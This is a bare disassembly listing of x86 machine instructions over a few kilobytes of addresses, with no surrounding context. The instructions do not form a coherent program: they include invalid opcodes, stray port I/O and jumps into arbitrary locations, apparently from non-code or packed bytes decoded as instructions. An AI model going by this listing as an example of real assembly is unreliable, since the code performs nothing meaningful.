  412054:	sub    eax,0x7c71b7a1
  412059:	cmp    ebp,DWORD PTR [edx-0x7c]
  41205c:	arpl   bx,cx
  41205e:	jbe    0x41205f
  412060:	neg    BYTE PTR ds:0x5301fc07
  412066:	mov    cl,0xf6
  412068:	out    0x54,eax
  41206a:	ja     0x412035
  41206c:	cld    
  41206d:	pop    esi
  41206e:	add    dl,BYTE PTR [esi+0x5e]
  412071:	jle    0x41201d
  412073:	mov    dh,0xb5
  412075:	test   al,0xa
  412077:	call   0xcac8a61b
  41207c:	outs   dx,DWORD PTR ds:[esi]
  41207d:	mov    ebp,0x13b7958b
  412082:	xor    BYTE PTR [ebp-0x4],bl
  412085:	add    eax,0xbd4127d6
  41208a:	in     eax,0x33
  41208c:	mov    WORD PTR es:[eax+ecx*4+0x5a],ss
  412091:	mov    dl,0xcb
  412093:	mov    al,ds:0xb397b9fd
  412098:	sbb    ah,BYTE PTR [eax+0x7f]
  41209b:	xor    ah,bh
  41209d:	and    eax,0x3afdeb12
  4120a2:	mov    esi,0xa3cffbc3
  4120a7:	je     0x4120fe
  4120a9:	mov    esp,0xf4e9b621
  4120ae:	neg    ecx
  4120b0:	jae    0x412094
  4120b2:	and    al,0x24
  4120b4:	fst    QWORD PTR [ecx-0x78]
  4120b7:	js     0x412062
  4120b9:	xor    BYTE PTR [ebp-0x61],ch
  4120bc:	lods   eax,DWORD PTR ds:[esi]
  4120bd:	or     eax,0x6223ff21
  4120c2:	and    esi,ebx
  4120c4:	jg     0x41204a
  4120c6:	jnp    0x4120e5
  4120c8:	js     0x412137
  4120ca:	sbb    DWORD PTR [eax],esi
  4120cc:	mov    ds:0xfc39663e,eax
  4120d1:	(bad)  
  4120d2:	repz inc eax
  4120d4:	pusha  
  4120d5:	in     eax,0x47
  4120d7:	pop    ebx
  4120d8:	inc    edi
  4120d9:	mov    dl,0x1f
  4120db:	mov    bl,0x4f
  4120dd:	daa    
  4120de:	and    DWORD PTR [ebx],ebx
  4120e0:	ret    
  4120e1:	mov    edi,0xe6fa99dd
  4120e6:	mov    dl,BYTE PTR [esi]
  4120e8:	dec    edx
  4120e9:	push   esi
  4120ea:	dec    ecx
  4120eb:	jmp    0x388:0xeb53c702
  4120f2:	cmp    DWORD PTR [edx-0x3f9dd2f0],ebp
  4120f8:	aam    0xd8
  4120fa:	jl     0x4120bd
  4120fc:	outs   dx,BYTE PTR ds:[esi]
  4120fd:	xor    ecx,DWORD PTR [edx]
  4120ff:	in     al,0xbd
  412101:	inc    ecx
  412102:	cmp    al,0xa0
  412104:	inc    edi
  412105:	inc    edx
  412106:	scas   al,BYTE PTR es:[edi]
  412107:	jb     0x41211f
  412109:	jmp    0x4120fa
  41210b:	sbb    dl,BYTE PTR [edi+0x74]
  41210e:	pop    es
  41210f:	sar    BYTE PTR [edx+0x65b30bd8],0x4a
  412116:	popf   
  412117:	xor    esi,DWORD PTR [ebx-0x1e3f4624]
  41211d:	dec    edi
  41211e:	and    edx,DWORD PTR ds:0xf0efedd8
  412124:	stos   DWORD PTR es:[edi],eax
  412125:	stos   DWORD PTR es:[edi],eax
  412126:	mov    edi,0xe593984
  41212b:	ja     0x41216e
  41212d:	ins    DWORD PTR es:[edi],dx
  41212e:	lods   eax,DWORD PTR ds:[esi]
  41212f:	pop    edx
  412130:	jns    0x412156
  412132:	ficom  WORD PTR [ecx+0x1468e2b6]
  412138:	std    
  412139:	pop    ebp
  41213a:	icebp  
  41213b:	or     BYTE PTR [ecx+edx*8-0x4dcdabb3],al
  412142:	sub    al,0x3c
  412144:	sar    ch,cl
  412146:	cs cmp al,0x33
  412149:	nop
  41214a:	cmc    
  41214b:	pop    esp
  41214c:	mov    ecx,0xf3cb0d80
  412151:	aad    0xaa
  412153:	sub    ecx,DWORD PTR [ebp+0x7c]
  412156:	sub    BYTE PTR [edx+ebx*1],cl
  412159:	mov    cl,bl
  41215b:	xor    al,0xc8
  41215d:	and    esp,ebx
  41215f:	test   al,0x9e
  412161:	sub    ebp,ebx
  412163:	iret   
  412164:	xor    edx,DWORD PTR [ebx]
  412166:	jmp    0x7260:0xb47999ac
  41216d:	icebp  
  41216e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41216f:	cs stos BYTE PTR es:[edi],al
  412171:	or     al,0xba
  412173:	daa    
  412174:	cmp    BYTE PTR [edx+0x6878b390],ah
  41217a:	push   es
  41217b:	mov    ds:0xb6885e3b,al
  412180:	lahf   
  412181:	pop    esp
  412182:	cli    
  412183:	loope  0x4121ff
  412185:	cmp    ah,BYTE PTR [ecx]
  412187:	xchg   edx,eax
  412188:	and    esi,DWORD PTR [eax+0x1c1149ac]
  41218e:	push   es
  41218f:	mov    DWORD PTR ds:0x5909073b,esi
  412195:	inc    esi
  412196:	xchg   esi,eax
  412197:	push   eax
  412198:	inc    esp
  412199:	bound  ecx,QWORD PTR [esi+esi*8+0x4b2a6db6]
  4121a0:	cmc    
  4121a1:	test   eax,0x6d2763bf
  4121a6:	call   0x7ee9ba75
  4121ab:	sahf   
  4121ac:	xor    bh,ch
  4121ae:	mov    BYTE PTR [edx-0x2f],dl
  4121b1:	stos   BYTE PTR es:[edi],al
  4121b2:	xchg   esi,eax
  4121b3:	pop    ds
  4121b4:	adc    BYTE PTR [esi],dl
  4121b6:	ins    BYTE PTR es:[edi],dx
  4121b7:	sbb    BYTE PTR [ecx],ah
  4121b9:	fwait
  4121ba:	push   cs
  4121bb:	push   ss
  4121bc:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4121bd:	outs   dx,BYTE PTR ds:[esi]
  4121be:	jne    0x4121dc
  4121c0:	jbe    0x41222a
  4121c2:	test   eax,0x869ec3d3
  4121c7:	shl    edi,1
  4121c9:	popa   
  4121ca:	out    dx,al
  4121cb:	pop    ss
  4121cc:	(bad)  
  4121cd:	push   cs
  4121ce:	sbb    BYTE PTR [eax-0x5fc229e7],ch
  4121d4:	jbe    0x4121d1
  4121d6:	mov    ebp,0x8d98875a
  4121db:	test   ecx,eax
  4121dd:	xor    ebx,DWORD PTR [eax]
  4121df:	into   
  4121e0:	xlat   BYTE PTR ds:[ebx]
  4121e1:	stos   BYTE PTR es:[edi],al
  4121e2:	push   ds
  4121e3:	adc    eax,0xa66f9505
  4121e8:	sbb    bl,BYTE PTR es:[eax]
  4121eb:	cmp    ebx,edi
  4121ed:	adc    DWORD PTR [eax+0x6b312fc9],ecx
  4121f3:	mov    WORD PTR [ebx],fs
  4121f5:	jg     0x4121ab
  4121f7:	or     al,0xa2
  4121f9:	inc    edx
  4121fa:	in     eax,0x4c
  4121fc:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4121fd:	popf   
  4121fe:	pusha  
  4121ff:	mov    al,ds:0x488af5af
  412204:	iret   
  412205:	dec    ebx
  412206:	dec    ebp
  412207:	ds pop ds
  412209:	sbb    esp,edx
  41220b:	mov    edi,0x30560e3e
  412210:	stos   BYTE PTR es:[edi],al
  412211:	mov    bl,0x3
  412213:	sub    eax,0x939bc9c4
  412218:	sub    al,dh
  41221a:	jp     0x412285
  41221c:	pop    ds
  41221d:	sti    
  41221e:	outs   dx,BYTE PTR ds:[esi]
  41221f:	inc    esi
  412220:	sbb    BYTE PTR [ecx-0x25063a7a],ch
  412226:	push   eax
  412227:	lds    esp,FWORD PTR [ecx-0x65]
  41222a:	into   
  41222b:	adc    esi,DWORD PTR [eax-0x3f5ba9b2]
  412231:	cld    
  412232:	xchg   DWORD PTR [edx],esi
  412234:	mov    al,0xcc
  412236:	je     0x412276
  412238:	add    DWORD PTR ds:0x35bbd3da,0x7b
  41223f:	into   
  412240:	and    al,0xa0
  412242:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  412243:	fnstenv [ecx-0x5f]
  412246:	fs inc ebx
  412248:	sub    eax,DWORD PTR [eax]
  41224a:	adc    DWORD PTR [edx-0x9],eax
  41224d:	and    ebx,ecx
  41224f:	ins    BYTE PTR es:[edi],dx
  412250:	mov    al,ch
  412252:	daa    
  412253:	in     eax,dx
  412254:	and    eax,0x9a068174
  412259:	sub    eax,0xe32ed4ca
  41225e:	lods   al,BYTE PTR ds:[esi]
  41225f:	add    bl,bh
  412261:	and    DWORD PTR [ecx+0x485fa147],ebp
  412267:	loop   0x412224
  412269:	retf   0x4bec
  41226c:	fwait
  41226d:	clc    
  41226e:	cwde   
  41226f:	jg     0x41222b
  412271:	stos   DWORD PTR es:[edi],eax
  412272:	rol    DWORD PTR [eax-0x3830d6a0],1
  412278:	xchg   esi,eax
  412279:	aad    0x2a
  41227b:	cmp    eax,0x502cdf46
  412280:	in     al,0x1a
  412282:	pusha  
  412283:	cmp    al,ch
  412285:	adc    ebx,DWORD PTR [esp+ebx*8-0x28031943]
  41228c:	call   0xc4270e35
  412291:	sub    eax,0xed6e07cb
  412296:	mov    al,0x81
  412298:	or     BYTE PTR [eax+0x8],ah
  41229b:	pop    esi
  41229c:	push   cs
  41229d:	adc    al,0x96
  41229f:	push   edx
  4122a0:	sar    bl,cl
  4122a2:	jp     0x412299
  4122a4:	gs xchg ebp,eax
  4122a6:	xor    ebx,esp
  4122a8:	xor    esi,DWORD PTR [edx]
  4122aa:	sbb    eax,0x4b779d6d
  4122af:	mov    dl,BYTE PTR [esi+0x49ff2252]
  4122b5:	push   0x19217581
  4122ba:	or     eax,0xe6bcf4d3
  4122bf:	jmp    FWORD PTR [eax+edx*4+0x3e]
  4122c3:	mov    ds:0x47bb4cbc,al
  4122c8:	(bad)  
  4122c9:	xor    edi,DWORD PTR [edi-0x15]
  4122cc:	add    eax,0xba2c1545
  4122d1:	jl     0x41233c
  4122d3:	xchg   ebp,eax
  4122d4:	jmp    0x1eadeb6
  4122d9:	push   ss
  4122da:	sbb    DWORD PTR [ebp-0x12],eax
  4122dd:	mov    cl,0x26
  4122df:	in     eax,dx
  4122e0:	sahf   
  4122e1:	cdq    
  4122e2:	xor    edx,ebp
  4122e4:	mov    DWORD PTR [edi],eax
  4122e6:	jge    0x412285
  4122e8:	add    al,0x2e
  4122ea:	inc    edi
  4122eb:	int    0x3
  4122ed:	pop    edi
  4122ee:	in     al,0xce
  4122f0:	mov    edx,DWORD PTR [edi-0x53]
  4122f3:	jno    0x4122c5
  4122f5:	fstp   TBYTE PTR [edx+edi*2]
  4122f8:	rcl    DWORD PTR [eax+0x17],cl
  4122fb:	test   DWORD PTR [esi],edi
  4122fd:	sbb    DWORD PTR [eax+0x20],edx
  412300:	jne    0x4122e0
  412302:	mov    al,cl
  412304:	mov    ebx,0xee6e6b47
  412309:	sar    DWORD PTR [edx],1
  41230b:	mov    eax,0xc027d06d
  412310:	mov    ch,0x26
  412312:	dec    eax
  412313:	cdq    
  412314:	addr16 mov ecx,0x16755380
  41231a:	test   al,0x76
  41231c:	gs out 0x46,eax
  41231f:	and    al,0x75
  412321:	sbb    DWORD PTR [edx+0x148e0efe],esi
  412327:	outs   dx,BYTE PTR ds:[esi]
  412328:	add    dl,bh
  41232a:	mov    ebp,0x5550a51
  412330:	stos   BYTE PTR es:[edi],al
  412331:	popa   
  412332:	lock xchg ecx,eax
  412334:	dec    edi
  412335:	ja     0x412335
  412337:	stos   BYTE PTR es:[edi],al
  412338:	fwait
  412339:	sub    al,0x72
  41233b:	popa   
  41233c:	dec    ecx
  41233d:	jecxz  0x4122d8
  41233f:	mov    edx,0xa9890965
  412344:	or     eax,DWORD PTR ss:[ecx+0x1426c607]
  41234b:	lea    edi,[edi-0x42]
  41234e:	cli    
  41234f:	(bad)  
  412350:	out    0x88,eax
  412352:	fst    QWORD PTR [eax+0x2e]
  412355:	icebp  
  412356:	or     BYTE PTR [ebx],bh
  412358:	stos   DWORD PTR es:[edi],eax
  412359:	sbb    al,0x1c
  41235b:	jp     0x4122ff
  41235d:	ds xchg ebx,eax
  41235f:	cmp    eax,esi
  412361:	fs fs (bad) 
  412364:	dec    ebp
  412365:	sbb    al,BYTE PTR [ecx+eax*2-0x38783cb8]
  41236c:	in     al,dx
  41236d:	push   esp
  41236e:	bound  ebp,QWORD PTR [eax]
  412370:	xor    dh,0xea
  412373:	leave  
  412374:	jno    0x412396
  412376:	push   cs
  412377:	mov    WORD PTR [esp+eiz*4+0x402a080f],es
  41237e:	adc    cl,BYTE PTR [ebp-0x590e4f5f]
  412384:	push   0xcb5111ab
  412389:	mov    ebp,0x9ee3bfaf
  41238e:	scas   eax,DWORD PTR es:[edi]
  41238f:	(bad)  
  412390:	fsub   DWORD PTR [edi]
  412392:	xor    ch,BYTE PTR [ebx+0x4253fdaa]
  412398:	jo     0x4123b6
  41239a:	mov    edi,0x42b998d
  41239f:	jmp    0x412416
  4123a1:	mov    BYTE PTR [ebx],al
  4123a3:	mov    bh,0x6a
  4123a5:	add    BYTE PTR [ebx+0x1a951958],cl
  4123ab:	sbb    BYTE PTR [ecx],bl
  4123ad:	sbb    ecx,DWORD PTR [ebp+0x3b]
  4123b0:	ja     0x412339
  4123b2:	popf   
  4123b3:	das    
  4123b4:	(bad)  
  4123b6:	repnz mov edi,0xa9bb4fc1
  4123bc:	out    dx,eax
  4123bd:	push   ebx
  4123be:	xlat   BYTE PTR ds:[ebx]
  4123bf:	inc    edi
  4123c0:	adc    al,BYTE PTR [ecx+0x71]
  4123c3:	xchg   edi,eax
  4123c4:	jb     0x412397
  4123c6:	mov    ebx,0xd155526c
  4123cb:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4123cc:	or     al,0xe9
  4123ce:	ret    
  4123cf:	mov    cl,0xa5
  4123d1:	ja     0x41242d
  4123d3:	das    
  4123d4:	inc    ebp
  4123d5:	pop    edi
  4123d6:	sub    edx,DWORD PTR [edi+0x79a9d1fa]
  4123dc:	push   0x7b02edc1
  4123e1:	mov    cl,0xf0
  4123e3:	clc    
  4123e4:	push   es
  4123e5:	sbb    al,0xfb
  4123e7:	xlat   BYTE PTR ds:[ebx]
  4123e8:	mov    al,BYTE PTR [ebx]
  4123ea:	das    
  4123eb:	repz idiv ecx
  4123ee:	xor    DWORD PTR [eax-0x46],ebx
  4123f1:	dec    edi
  4123f2:	into   
  4123f3:	stos   BYTE PTR es:[edi],al
  4123f4:	retf   
  4123f5:	pop    ebx
  4123f6:	popa   
  4123f7:	cmc    
  4123f8:	or     eax,0x3856ab80
  4123fd:	adc    al,0xa1
  4123ff:	mov    ds:0x5df209bf,eax
  412404:	xor    eax,0x5a480cdb
  412409:	(bad)  
  41240a:	outs   dx,DWORD PTR ds:[esi]
  41240b:	and    BYTE PTR [edi-0x54],0xd5
  41240f:	retf   0x7f4d
  412412:	lock dec edi
  412414:	push   edi
  412415:	push   edi
  412416:	test   DWORD PTR [ecx+0x4b],esp
  412419:	loop   0x41240a
  41241b:	imul   edi,DWORD PTR [ebx+0x1c],0xffffffa4
  41241f:	fsubp  st(5),st
  412421:	pop    edx
  412422:	pusha  
  412423:	retf   0x1b48
  412426:	(bad)  
  412427:	xlat   BYTE PTR ds:[ebx]
  412428:	add    BYTE PTR [edi+0x43],al
  41242b:	add    al,0x24
  41242d:	push   cs
  41242e:	test   dh,ch
  412430:	jecxz  0x4123e1
  412432:	bound  edx,QWORD PTR ds:0x9fd95da4
  412438:	shr    DWORD PTR ds:0x456b4ebd,cl
  41243e:	daa    
  41243f:	fstp   QWORD PTR [edi-0x72f17ba4]
  412445:	retf   
  412446:	adc    ah,BYTE PTR [edx+0xf]
  412449:	fs sub eax,ebp
  41244c:	adc    al,0xe9
  41244e:	outs   dx,DWORD PTR ds:[esi]
  41244f:	jno    0x4123f2
  412451:	mov    al,0x52
  412453:	push   esi
  412454:	cmp    eax,ebp
  412456:	popf   
  412457:	xor    DWORD PTR [edi+0x7f5fcedc],esp
  41245d:	push   es
  41245e:	inc    edx
  41245f:	cmp    ebp,DWORD PTR ds:0x11cba699
  412465:	dec    ebx
  412466:	stos   BYTE PTR es:[edi],al
  412467:	add    BYTE PTR [edi+0x16431f6a],0xe
  41246e:	in     al,0x46
  412470:	ret    
  412471:	jo     0x4124b6
  412473:	cli    
  412474:	enter  0x171e,0xe6
  412478:	cmp    al,0x8a
  41247a:	(bad)  
  41247b:	iret   
  41247c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41247d:	and    DWORD PTR [eax],0xffffffb6
  412480:	sti    
  412481:	jge    0x4124e5
  412483:	rcr    DWORD PTR cs:[edx-0x553dba62],1
  41248a:	sahf   
  41248b:	shl    DWORD PTR [edi+0x37],0xfd
  41248f:	addr16 mov dl,0xa2
  412492:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  412493:	std    
  412494:	add    edi,DWORD PTR [edi+0x44]
  412497:	bound  edi,QWORD PTR [esi+0x28]
  41249a:	cld    
  41249b:	mov    eax,ds:0x5c2abc3f
  4124a0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4124a1:	fs into 
  4124a3:	push   esi
  4124a4:	test   BYTE PTR [eax-0x45eb2396],ch
  4124aa:	test   eax,0xaaefb6f
  4124af:	jg     0x41245d
  4124b1:	sub    ah,BYTE PTR [ecx]
  4124b3:	popa   
  4124b4:	or     eax,0x612c4080
  4124b9:	pop    ds
  4124ba:	mov    ebp,0xca3210da
  4124bf:	jo     0x412509
  4124c1:	sub    al,0x25
  4124c3:	shl    DWORD PTR [ebx],cl
  4124c5:	dec    ebx
  4124c6:	rcl    DWORD PTR [eax+eiz*8],cl
  4124c9:	push   ebx
  4124ca:	not    BYTE PTR [ebp+0x9a53840]
  4124d0:	sbb    BYTE PTR [ebx-0x539ca6ca],dl
  4124d6:	hlt    
  4124d7:	sbb    DWORD PTR [edx+0x36],edx
  4124da:	fidiv  DWORD PTR [bp+si+0x3f4f]
  4124df:	jmp    0x4e2:0xecf37431
  4124e6:	jle    0x4124b2
  4124e8:	push   ecx
  4124e9:	or     ah,BYTE PTR [ebp-0x7d2a86d3]
  4124ef:	pop    ebx
  4124f0:	(bad)  
  4124f2:	jge    0x412484
  4124f4:	inc    edx
  4124f5:	add    eax,0x145330d3
  4124fa:	mov    ds:0x4623d3a2,eax
  4124ff:	lods   eax,DWORD PTR ds:[esi]
  412500:	xchg   edx,eax
  412501:	imul   edx,DWORD PTR [ecx+0x30],0x63
  412505:	repnz inc ebx
  412507:	scas   al,BYTE PTR es:[edi]
  412508:	jae    0x41254a
  41250a:	cmp    BYTE PTR [edi-0x61],bl
  41250d:	inc    ecx
  41250e:	ret    
  41250f:	imul   ebp,DWORD PTR [eax+0x5a19b08c],0x5c52234f
  412519:	add    al,0x78
  41251b:	je     0x412575
  41251d:	sub    esp,ebx
  41251f:	pop    edi
  412520:	bound  ebp,QWORD PTR [edi+eiz*2-0x3f]
  412524:	dec    eax
  412525:	daa    
  412526:	daa    
  412527:	(bad)  
  412528:	outs   dx,BYTE PTR ds:[esi]
  412529:	fbstp  TBYTE PTR [edx-0x14]
  41252c:	mov    dh,0x28
  41252e:	push   ebp
  41252f:	add    DWORD PTR [edx-0x536b6986],edx
  412535:	xchg   ebp,eax
  412536:	arpl   WORD PTR [ecx-0x46877e00],cx
  41253c:	int3   
  41253d:	inc    ecx
  41253e:	and    esi,DWORD PTR [esi+0x441388a9]
  412544:	int3   
  412545:	into   
  412546:	not    BYTE PTR [esi+0x224cee95]
  41254c:	adc    BYTE PTR [edx-0x56dc5e2],al
  412552:	scas   eax,DWORD PTR es:[edi]
  412553:	out    0xc,eax
  412555:	in     eax,0x40
  412557:	mov    ebx,0x6224cfaa
  41255c:	leave  
  41255d:	add    ecx,esi
  41255f:	dec    edi
  412560:	mov    edx,0x92f7bec3
  412565:	jo     0x41252f
  412567:	xor    DWORD PTR [esi],eax
  412569:	push   ss
  41256a:	mov    DWORD PTR [ebx+0x363bb9f3],ebp
  412570:	adc    DWORD PTR [eax-0x419885da],esi
  412576:	mov    dh,0x8c
  412578:	cli    
  412579:	sub    dl,dl
  41257b:	xchg   esp,eax
  41257c:	in     eax,0xf8
  41257e:	push   0x1203fbe8
  412583:	outs   dx,BYTE PTR ds:[esi]
  412584:	mov    esi,0x6d94bc48
  412589:	(bad)  
  41258b:	outs   dx,BYTE PTR ds:[esi]
  41258c:	dec    ebp
  41258d:	arpl   WORD PTR [ebx-0x17],si
  412590:	es out dx,eax
  412592:	mov    cl,0xb5
  412594:	pop    ebp
  412595:	in     al,dx
  412596:	in     eax,0xa6
  412598:	js     0x4125cd
  41259a:	std    
  41259b:	push   eax
  41259c:	push   cs
  41259d:	push   0xffffffe7
  41259f:	lds    ecx,FWORD PTR ds:0xdc153f8b
  4125a5:	repz lock mov al,0xd2
  4125a9:	ins    BYTE PTR es:[edi],dx
  4125aa:	(bad)  
  4125ab:	push   ecx
  4125ac:	mov    al,0xdd
  4125ae:	sub    ch,BYTE PTR [eax+0x57c614bd]
  4125b4:	dec    ecx
  4125b5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4125b6:	jns    0x4125d8
  4125b8:	xchg   ebp,eax
  4125b9:	ds dec ebp
  4125bb:	sbb    DWORD PTR [edx+0x2a],0xe96ec230
  4125c2:	push   esp
  4125c3:	xlat   BYTE PTR ds:[ebx]
  4125c4:	jns    0x4125a9
  4125c6:	xor    ah,BYTE PTR cs:[ecx]
  4125c9:	in     al,dx
  4125ca:	aas    
  4125cb:	repz iret 
  4125cd:	rol    DWORD PTR [eax+0x4e605ebc],0xe4
  4125d4:	test   al,0xc8
  4125d6:	sbb    DWORD PTR [ecx-0x42e467e2],esp
  4125dc:	jbe    0x412598
  4125de:	test   BYTE PTR [eax-0x1625163a],dh
  4125e4:	push   ds
  4125e5:	xchg   esp,eax
  4125e6:	in     al,dx
  4125e7:	dec    esi
  4125e8:	rcl    ecx,cl
  4125ea:	inc    al
  4125ec:	sub    DWORD PTR [ebx+0x7c],ecx
  4125ef:	test   BYTE PTR [ebp+eiz*8-0x5],0xa7
  4125f4:	xor    bl,ah
  4125f6:	add    esp,DWORD PTR [eax]
  4125f8:	adc    eax,0x56d662d1
  4125fd:	mov    cl,0x86
  4125ff:	lahf   
  412600:	ror    BYTE PTR [ebp+ebx*4-0x738957a9],1
  412607:	xchg   edx,eax
  412608:	lahf   
  412609:	retf   
  41260a:	inc    ecx
  41260b:	xchg   ah,bl
  41260d:	fstp   TBYTE PTR [edx+0x13135cc8]
  412613:	sub    ch,BYTE PTR [eax-0x61]
  412616:	mov    ds:0xd7acde01,al
  41261b:	test   bl,ah
  41261d:	push   ecx
  41261e:	loop   0x412615
  412620:	mov    ch,0x30
  412622:	mov    esp,DWORD PTR [ecx+0x3f]
  412625:	(bad)  
  412626:	and    ch,ch
  412628:	daa    
  412629:	aad    0x85
  41262b:	ror    DWORD PTR [ecx+0x43],cl
  41262e:	push   ebp
  41262f:	lds    eax,FWORD PTR ds:0xc9eb3b60
  412635:	jp     0x4125ba
  412637:	sar    DWORD PTR [edx+eiz*1+0x15],cl
  41263b:	pop    ebp
  41263c:	adc    DWORD PTR [edi-0x12ace8b3],eax
  412642:	(bad)  
  412643:	dec    esp
  412644:	neg    DWORD PTR [edx+0x75]
  412647:	xor    eax,0xfdc9d01e
  41264c:	mov    dl,0x1a
  41264e:	(bad)  
  412650:	mov    ds:0xb9f977c5,eax
  412655:	lahf   
  412656:	mov    ah,0xcf
  412658:	sub    eax,0xf25fa835
  41265d:	adc    al,0x1c
  41265f:	stos   BYTE PTR es:[edi],al
  412660:	push   cs
  412661:	mov    ds:0x3f9911b8,al
  412666:	icebp  
  412667:	jno    0x412607
  412669:	lock jns 0x41260a
  41266c:	fwait
  41266d:	pop    eax
  41266e:	inc    eax
  41266f:	xchg   esi,eax
  412670:	adc    ebx,DWORD PTR [ebx]
  412672:	iret   
  412673:	add    al,0x39
  412675:	pop    edx
  412676:	add    al,0x63
  412678:	jbe    0x4126e7
  41267a:	pop    edx
  41267b:	inc    ecx
  41267c:	imul   edi,DWORD PTR [ebp+0x34e8b5a],0xd63098a1
  412686:	and    ah,bl
  412688:	mov    bh,0x4e
  41268a:	inc    ecx
  41268b:	sub    DWORD PTR [esi],edx
  41268d:	icebp  
  41268e:	pop    ebx
  41268f:	mov    edi,0xb4313ba0
  412694:	aaa    
  412695:	js     0x4126ee
  412697:	xor    BYTE PTR ds:0xae0a1eee,dl
  41269d:	jns    0x412641
  41269f:	lods   eax,DWORD PTR ds:[esi]
  4126a0:	(bad)  
  4126a1:	cdq    
  4126a2:	fdivp  st(5),st
  4126a4:	fld    st(6)
  4126a6:	js     0x412656
  4126a8:	ja     0x412719
  4126aa:	jmp    0x41263c
  4126ac:	mov    edi,DWORD PTR [esi+0x29db49f8]
  4126b2:	sub    dh,al
  4126b4:	stc    
  4126b5:	retf   0x3bf3
  4126b8:	pop    esi
  4126b9:	mov    ds:0x863bbb93,al
  4126be:	shl    ebp,0x81
  4126c1:	sub    dh,BYTE PTR [ebx+0x4c]
  4126c4:	sub    DWORD PTR [edx+0x32b4531b],edi
  4126ca:	or     ah,BYTE PTR [edi]
  4126cc:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4126cd:	dec    esi
  4126ce:	fbstp  TBYTE PTR [eax+0x71]
  4126d1:	arpl   WORD PTR [esi-0x3f7e3172],ax
  4126d7:	jecxz  0x41266e
  4126d9:	cmp    BYTE PTR [eax-0x2c],ch
  4126dc:	lods   eax,DWORD PTR ds:[esi]
  4126dd:	ret    0x3258
  4126e0:	xor    DWORD PTR ds:0x33a981e0,0x1
  4126e7:	(bad)  
  4126e8:	rcl    DWORD PTR [edx],1
  4126ea:	inc    ecx
  4126eb:	in     eax,dx
  4126ec:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4126ed:	clc    
  4126ee:	stc    
  4126ef:	pop    eax
  4126f0:	lds    esi,FWORD PTR [edi+0x3]
  4126f3:	push   edx
  4126f4:	(bad)  
  4126f5:	dec    DWORD PTR [ebp-0x6614eba2]
  4126fb:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4126fc:	retf   
  4126fd:	mov    cl,0x79
  4126ff:	or     BYTE PTR [edx+0x67],cl
  412702:	jne    0x4126eb
  412704:	mov    BYTE PTR [ebx+0x369f8fe2],bl
  41270a:	jmp    0x15c3b273
  41270f:	pusha  
  412710:	stos   BYTE PTR es:[edi],al
  412711:	pop    ss
  412712:	lods   al,BYTE PTR ds:[esi]
  412713:	fsubr  QWORD PTR [ebp-0x4a]
  412716:	pop    esi
  412717:	cmovo  esi,esi
  41271a:	setl   dl
  41271d:	xchg   BYTE PTR [ebx-0x64],bl
  412720:	dec    ebp
  412721:	test   BYTE PTR [edi],dl
  412723:	sub    al,0xef
  412725:	cmp    al,0xc9
  412727:	jmp    0xc433b262
  41272c:	and    al,0xc2
  41272e:	cmp    ch,ah
  412730:	inc    ebx
  412731:	lea    edx,[ebx-0x38f702ec]
  412737:	retf   0x413a
  41273a:	mov    WORD PTR [ebx-0x634a8516],es
  412740:	test   DWORD PTR [ecx+0x6b4d897c],edi
  412746:	lea    ebp,[edx]
  412748:	cli    
  412749:	sbb    eax,0x2c071a74
  41274e:	fmul   QWORD PTR [ecx]
  412750:	inc    esi
  412751:	aaa    
  412752:	cdq    
  412753:	pusha  
  412754:	pop    ebp
  412755:	and    eax,0x35d9b340
  41275a:	and    BYTE PTR [eax],al
  41275c:	push   esp
  41275d:	scas   al,BYTE PTR es:[edi]
  41275e:	xor    esi,ecx
  412760:	or     dh,dh
  412762:	cmp    al,0x60
  412764:	and    dl,dl
  412766:	push   esi
  412767:	jle    0x412759
  412769:	inc    ecx
  41276a:	cli    
  41276b:	je     0x41278b
  41276d:	xchg   ebx,eax
  41276e:	sbb    DWORD PTR [ebp+0x8000cf9],0x61cb3597
  412778:	fstp   st(0)
  41277a:	leave  
  41277b:	sub    esp,esi
  41277d:	xor    ch,al
  41277f:	inc    edx
  412780:	xor    ebp,edx
  412782:	mov    edx,0x39fd9d81
  412787:	outs   dx,DWORD PTR ds:[esi]
  412788:	pop    ecx
  412789:	clc    
  41278a:	pop    ebx
  41278b:	iret   
  41278c:	ss sbb eax,0xd35cf0b1
  412792:	pop    ds
  412793:	push   ebp
  412794:	cmp    bh,BYTE PTR ds:0x1fded4c7
  41279a:	pop    eax
  41279b:	sub    ebx,ebx
  41279d:	rdtsc  
  41279f:	aaa    
  4127a0:	sahf   
  4127a1:	ret    
  4127a2:	xor    DWORD PTR [ebx+0x3a7f1682],0x41e34c5c
  4127ac:	sub    edi,0xffffffd4
  4127af:	push   cs
  4127b0:	xchg   ebx,eax
  4127b1:	dec    eax
  4127b2:	add    dh,BYTE PTR [eax+0x7437f4aa]
  4127b8:	lods   al,BYTE PTR ds:[esi]
  4127b9:	mov    esp,0xeaf1b04
  4127be:	xchg   ebx,eax
  4127bf:	pop    edx
  4127c0:	pop    ss
  4127c1:	ds adc al,0xe9
  4127c4:	mov    ax,0xbff
  4127c8:	xor    DWORD PTR [eax],edx
  4127ca:	mov    ds:0x13bf3c79,eax
  4127cf:	jle    0x4127fd
  4127d1:	hlt    
  4127d2:	or     al,0xde
  4127d4:	ficom  WORD PTR [edi-0x7a]
  4127d7:	inc    edi
  4127d8:	lods   al,BYTE PTR ds:[esi]
  4127d9:	mov    ah,0x96
  4127db:	daa    
  4127dc:	add    ch,dl
  4127de:	or     dh,bl
  4127e0:	dec    esi
  4127e1:	push   ss
  4127e2:	cmp    esi,ebp
  4127e4:	out    0x26,al
  4127e6:	mov    cl,0x98
  4127e8:	cmp    al,BYTE PTR [esi+edx*4]
  4127eb:	jmp    FWORD PTR [esi+0x31124d3c]
  4127f1:	mov    dl,BYTE PTR [ebx-0x2955a293]
  4127f7:	adc    edi,DWORD PTR [ebx]
  4127f9:	ss xchg edi,eax
  4127fb:	push   ebx
  4127fc:	(bad)  
